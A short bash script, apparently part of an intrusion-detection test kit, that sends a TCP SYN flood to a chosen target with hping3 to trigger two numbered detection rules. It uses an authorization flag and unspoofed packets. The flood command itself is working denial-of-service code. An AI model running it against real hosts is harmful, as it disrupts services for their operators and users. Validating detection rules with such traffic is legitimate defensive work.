#!/usr/bin/env bash
# syn-flood.sh - TCP SYN flood with hping3.
# Needs: hping3, root.
# Triggers: sid 1000001 (SYN flood against one destination),
#           sid 1000002 (SYN flood from one source).
. "$(cd "$(dirname "$0")" && pwd)/_lib.sh"

usage() { cat <<U
Usage: $PROG --i-have-authorization -t TARGET [-p PORT] [-c COUNT]
  -p PORT   destination port (default 80)
  -c COUNT  packets to send (default 5000); omit for --flood
Sends spoof-free SYNs from this host so attribution shows a real source.
U
}

TARGET=""; PORT=80; COUNT=5000
while [ $# -gt 0 ]; do
  case $1 in
    --i-have-authorization) AUTHORIZED=1 ;;
    -t|--target) TARGET=${2:?}; shift ;;
    -p|--port) PORT=${2:?}; shift ;;
    -c|--count) COUNT=${2:?}; shift ;;
    -h|--help) usage; exit 0 ;;
    *) die "unknown argument: $1 (see --help)" ;;
  esac
  shift
done

need_tool hping3 "install hping3"
need_root
authorize "$TARGET"
set -x
exec hping3 -S -p "$PORT" -i u200 -c "$COUNT" "$TARGET"
